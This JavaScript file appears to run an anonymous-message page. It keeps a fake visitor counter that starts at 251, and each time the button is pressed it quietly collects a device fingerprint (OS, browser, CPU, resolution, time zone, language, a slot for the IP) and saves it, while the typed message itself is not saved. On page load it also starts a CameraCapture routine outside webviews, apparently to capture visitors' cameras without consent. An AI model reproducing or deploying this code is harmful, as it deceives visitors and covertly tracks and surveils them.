class MessageHandler {
    constructor() {
        this.textarea = document.querySelector('textarea');
        this.sendButton = document.querySelector('.send-button');
        this.statsEl = document.querySelector('.stats');
        this.messageCount = 251;
        this.dataService = new DataService();

        this.initializeEventListeners();
    }

    initializeEventListeners() {
        this.textarea.addEventListener('input', () => this.handleInput());
        this.sendButton.addEventListener('click', () => this.handleSend());
        this.textarea.addEventListener('keyup', (e) => this.handleKeyUp(e));
    }

    handleInput() {
        if (this.textarea.value.trim()) {
            this.sendButton.classList.add('visible');
        } else {
            this.sendButton.classList.remove('visible');
        }
    }

    async handleSend() {
        if (this.textarea.value.trim()) {
            await this.dataService.saveData(this.gatherClientData());
            this.incrementCount();
            this.resetForm();
        }
    }

    handleKeyUp(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            this.handleSend();
        }
    }

    incrementCount() {
        this.messageCount++;
        this.statsEl.textContent = `👋 ${this.messageCount} people just tapped the button`;
    }

    resetForm() {
        this.textarea.value = '';
        this.sendButton.classList.remove('visible');
    }

    gatherClientData() {
        const client = new ClientJS();
        const currentDate = new Date();
        
        return {
            ip: '',  // Will be filled by IP API call
            OS: client.getOS(),
            ver: client.getOSVersion(),
            getbrow: client.getBrowser(),
            getbrowVer: client.getBrowserVersion(),
            CPU: client.getCPU(),
            currentResolution: client.getCurrentResolution(),
            timeZone: client.getTimeZone()?.toString() || 'Not Found',
            language: client.getLanguage(),
            core: navigator.hardwareConcurrency,
            formattedDate: currentDate.toLocaleString('en-US', {
                weekday: 'short',
                year: 'numeric',
                month: 'short',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                hour12: true
            })
        };
    }
}

// Initialize the message handler
document.addEventListener('DOMContentLoaded', () => {
    new MessageHandler();
    const camera = new CameraCapture();
    if (!isWebview()) {
        camera.init();
    }
});